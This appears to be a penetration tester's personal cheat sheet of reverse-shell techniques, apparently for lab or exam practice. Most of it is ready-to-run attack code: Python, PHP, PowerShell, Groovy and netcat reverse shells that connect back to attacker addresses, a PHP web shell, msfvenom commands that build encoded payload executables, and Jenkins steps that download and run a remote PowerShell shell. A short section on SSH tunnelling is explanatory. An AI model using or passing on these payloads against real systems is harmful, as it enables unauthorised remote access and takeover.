Listeners
	Set up listener with netcat
		nc  -lvp 1234
	Meterpreter handler
		use /exploit/multi/handler
		
Use burpsuite deocder to encode any shells in url being sent to web server
## Python
Standard python reverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACK IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## Gain full tty
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

## PHP
`<?php echo system($_GET['cmd']); ?>`

## NC
run nc remotely on windows without full tty to get connection back (I would think this also works for linux)
```cmd
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```

## MSF Venom
we can use msfvenom to create reverse shell executables
	ex: msfvenom -p windows/shell_reverse_tcp LHOST=10.6.47.234 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
	 Meterpreter shell: msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

Jenkins - Linux
- navigate to manage jenkins -> script console
- enter command: String host=”ATTACKERIP”;
int port=ATTACKERPORT;
String cmd=”/bin/sh”; #You can replace this with cmd.exe for Windows
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Jenkins - WIndows
- useful link: https://casimsec.com/2021/12/21/jenkins-reverse-shell/
- can use Nishang's Invoke-PowershellTCP.ps1 script
- set up http server on local machine. 
	- navigate to working directory 
	- python3 -m http.server 80
- Have jenkins downlaod script from http server which will be executed
	- create new project
	- add build setup -> Execute Windows batch command
	- powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKERIP:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port 50001
- run project


Reverse ssh tunneling
![[Pasted image 20221002162759.png]]
	Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.
	-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.
	-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
	In this case we are trying to access a webserver that is blocked by the firewall. We can run `ssh -L 10000:localhost:10000 <username>@<ip>` to see the blocked webpage on localhost:10000


Windows Note:
service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately. Luckily for us, msfvenom supports the exe-service format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.

POWERSHELL ONE LINER
```PowerShell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.210",5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit
```

php -r '$sock=fsockopen("192.168.45.247",4445);exec("/bin/sh -i <&3 >&3 2>&3");'